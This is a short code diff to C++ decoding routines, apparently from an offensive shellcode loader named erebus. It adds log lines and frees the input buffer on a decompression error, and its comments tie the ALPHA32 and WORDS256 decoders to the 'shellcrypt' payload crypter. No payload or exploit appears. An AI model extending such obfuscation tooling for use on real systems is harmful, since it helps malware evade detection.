@@ -34,6 +34,9 @@ namespace erebus {
 		{
 			LOG_ERROR("RtlDecompressBuffer failed 0x%08lX", status);
 			free(Output);
+			free(*Input);
+			*Input   = nullptr;
+			*InputLen = 0;
 			return;
 		}
 
@@ -137,6 +140,7 @@ namespace erebus {
 
 	BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
+		LOG_INFO("Decoding Base64");
 		SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
 		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
 		SIZE_T DecodedLen = 0;
@@ -169,6 +173,7 @@ namespace erebus {
 
 	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
+		LOG_INFO("Decoding ASCII85");
 		SIZE_T OutputCapacity = (InputLen / 5) * 4 + 4;
 		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
 		SIZE_T DecodedLen = 0;
@@ -199,6 +204,7 @@ namespace erebus {
 
 	BOOL DecodeALPHA32(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
+		LOG_INFO("Decoding ALPHA32");
 		// Alphabet must match shellcrypt exactly (crypters.py __alpha32_encode).
 		// Each byte is encoded as alphabet[byte % len(alphabet)].
 		// Decode: find char position in alphabet → that is the byte value.
@@ -232,6 +238,7 @@ namespace erebus {
 
 	BOOL DecodeWORDS256(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
+		LOG_INFO("Decoding WORDS256");
 		// shellcrypt words256: each byte encoded as kWords[byte % 26] + " "
 		// Decode: look up word in table, return its index.
 		// Same word list as crypters.py __words256_encode/__words256_decode.
